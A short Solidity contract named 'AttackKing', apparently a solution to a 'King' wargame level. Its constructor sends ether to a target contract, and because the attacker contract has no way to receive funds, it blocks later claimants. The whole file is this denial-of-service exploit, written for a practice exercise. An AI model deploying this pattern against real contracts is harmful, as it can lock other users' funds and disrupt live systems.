// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract AttackKing {
    constructor(address _contractAddress) payable {
        _contractAddress.call{value: 1000000000000001 wei}("");
    }
}
// don't forget specify value before deploying contract
